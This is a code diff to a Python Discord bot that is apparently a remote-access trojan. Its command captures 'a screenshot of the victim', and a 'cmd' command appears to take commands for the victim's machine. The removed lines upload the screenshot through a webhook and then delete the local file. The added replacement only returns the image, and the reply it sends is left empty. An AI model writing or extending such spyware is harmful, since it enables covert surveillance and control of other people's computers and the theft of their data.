@@ -53,18 +53,13 @@ async def cmd(interaction: discord.Interaction, command: str):
 
 @bot.tree.command(name="screenshot", description="get a screenshot of the victim")
 async def ping(interaction: discord.Interaction):
-	Screenshot()
+	img = takeScreenshot()
 	await interaction.response.send_message()
 
 
-def Screenshot(self) -> None:
-	imgName = time.strftime("%Y%m%d-%H%M%S.jpg")
-	imgPath = join(self.temp, imgName)
-	img = pyautogui.screenshot(imgPath)
-	with open(imgPath, "rb") as file:
-		self.screenWebHook.add_file(file=file.read(), filename=imgName)
-	self.screenWebHook.execute(remove_files=True)
-	os.remove(imgPath)
+def takeScreenshot() -> Any:
+	img = pyautogui.screenshot()
+	return img
 
 
 bot.run(token=Token)
